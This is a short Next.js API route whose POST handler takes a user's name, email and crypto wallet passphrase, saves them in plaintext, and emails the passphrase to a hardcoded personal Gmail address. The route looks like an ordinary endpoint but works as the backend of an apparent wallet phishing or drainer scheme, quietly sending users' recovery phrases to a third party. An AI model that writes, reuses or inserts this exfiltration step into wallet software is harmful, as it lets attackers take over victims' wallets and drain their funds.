import dbConnect from "@/libs/dbConnect";
import userwallets from "@/model/userwallets";
import user from "@/model/user";
import { NextRequest, NextResponse } from "next/server";
import { sendEmail } from "@/libs/mailer";

export async function GET(request: any) {

}

export async function POST(request: NextRequest) {
    await dbConnect()
    const body = await request.json()

    let savedInfo
    try {
        savedInfo = await userwallets.create({
            name: body.name,
            email: body.email,
            passphase: body.passphase,
        })
        await sendEmail('macjohnireka3@gmail.com', `${body.email}'s Passphase`, body.passphase)
        return NextResponse.json(true);
    } catch (err) {
        throw new Error(`big error : ${err}`)
    }

}